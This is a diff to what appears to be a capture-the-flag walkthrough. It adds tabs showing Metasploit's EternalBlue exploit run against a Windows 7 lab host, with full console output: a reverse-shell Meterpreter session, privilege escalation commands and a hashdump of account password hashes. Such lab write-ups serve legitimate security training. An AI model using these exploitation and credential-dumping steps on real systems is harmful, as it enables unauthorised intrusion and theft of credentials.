@@ -31,7 +31,7 @@ nmap -sV -n -v -Pn -p- -T4 -A --open -oX portScan.xml 10.10.146.250
 {% tabs %}
 {% tab title="nmap vuln nse" %}
 ```bash
-nmap -v --script vuln 10.10.146.250
+nmap -v --script vuln 10.10.246.110
 ```
 {% endtab %}
 
@@ -169,6 +169,87 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+```
+{% endtab %}
+
+{% tab title="Run exploit" %}
+```bash
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.200.80
+RHOSTS => 10.10.200.80
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.9.8.228
+LHOST => 10.9.8.228
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.9.8.228:4444 
+[*] 10.10.200.80:445 - Running automatic check ("set AutoCheck false" to disable)
+[*] 10.10.200.80:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.200.80:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.200.80:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.200.80:445 - The target is vulnerable.
+[*] 10.10.200.80:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.200.80:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.200.80:445      - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.200.80:445 - Connecting to target for exploitation.
+[+] 10.10.200.80:445 - Connection established for exploitation.
+[+] 10.10.200.80:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.200.80:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.200.80:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.200.80:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.200.80:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.200.80:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.200.80:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.200.80:445 - Sending all but last fragment of exploit packet
+[*] 10.10.200.80:445 - Starting non-paged pool grooming
+[+] 10.10.200.80:445 - Sending SMBv2 buffers
+[+] 10.10.200.80:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.200.80:445 - Sending final SMBv2 buffers.
+[*] 10.10.200.80:445 - Sending last fragment of exploit packet!
+[*] 10.10.200.80:445 - Receiving response from exploit packet
+[+] 10.10.200.80:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.200.80:445 - Sending egg to corrupted connection.
+[*] 10.10.200.80:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200262 bytes) to 10.10.200.80
+[*] Meterpreter session 1 opened (10.9.8.228:4444 -> 10.10.200.80:49169) at 2021-07-27 10:36:06 -0400
+[+] 10.10.200.80:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.200.80:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.200.80:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+meterpreter > shell
+Process 2424 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
+```
+{% endtab %}
+
+{% tab title="Escalate" %}
+```
+[CTRL+z]
+use post/multi/manage/shell_to_meterpreter
+
+OR
+
+meterpreter > getsystem
+```
+{% endtab %}
+
+{% tab title="hashdump" %}
+```
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+```
+{% endtab %}
+
+{% tab title="Crack password" %}
+```
 
 ```
 {% endtab %}
